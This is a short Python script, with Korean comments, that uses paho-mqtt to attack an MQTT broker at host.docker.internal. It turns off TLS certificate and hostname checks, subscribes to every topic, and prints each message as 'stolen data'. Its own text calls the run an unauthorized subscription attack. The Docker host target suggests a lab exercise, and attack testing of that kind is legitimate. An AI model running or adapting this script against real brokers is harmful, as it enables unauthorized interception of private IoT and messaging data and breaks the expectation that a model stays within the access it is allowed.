import paho.mqtt.client as mqtt
import ssl
import time

# 요청하신 대로 이름표 사용
TARGET = "host.docker.internal"
PORT = 9883 #TLS 포트

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[*] {TARGET} 구독 성공! 데이터 탈취를 시작합니다.")
        client.subscribe("#")
    else:
        print(f"[!] 접속 실패. 응답 코드: {rc}")

def on_message(client, userdata, msg):
    print(f"[탈취 데이터] 토픽: {msg.topic} | 내용: {msg.payload.decode()}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

# 🛠️ 핵심: TLS 보안 검증을 '무시'하는 설정
# mosquitto_sub에서 안 됐던 "인증서 없는 TLS 접속"을 여기서 강제로 뚫습니다.
client.tls_set(cert_reqs=ssl.CERT_NONE) # 인증서 검사 안 함
client.tls_insecure_set(True)          # 호스트 이름 검사 안 함

print(f"[*] {TARGET}:{PORT}로 TLS 무단 구독 공격 시도 중...")

while True:
    try:
        client.connect(TARGET, PORT, 60)
        client.loop_forever()
    except Exception as e:
        print(f"[!] 연결 대기 중... ({e})")
        time.sleep(2)